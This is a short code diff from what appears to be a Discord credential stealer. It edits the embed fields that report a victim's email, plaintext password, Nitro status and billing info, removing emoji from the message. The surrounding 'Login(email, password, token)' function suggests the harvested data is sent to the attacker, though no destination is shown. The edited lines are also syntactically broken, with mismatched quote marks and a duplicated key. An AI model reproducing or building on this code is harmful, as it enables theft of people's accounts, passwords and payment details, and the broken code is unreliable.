@@ -155,8 +155,8 @@ function Login(email, password, token) {
                         },
 					
 			{
-                            "value": `:rocket:   Nitro: {nitro}  Billing Info: {billing}',
-			    "value": `:envelope: Email: ${email}  :love_letter: Password: ${password}`,
+                            "value": `Nitro: {nitro}  Billing Info: {billing}',
+			    "value": `Email: ${email}   Password: ${password}`,
                             "inline": true
                         }
                     
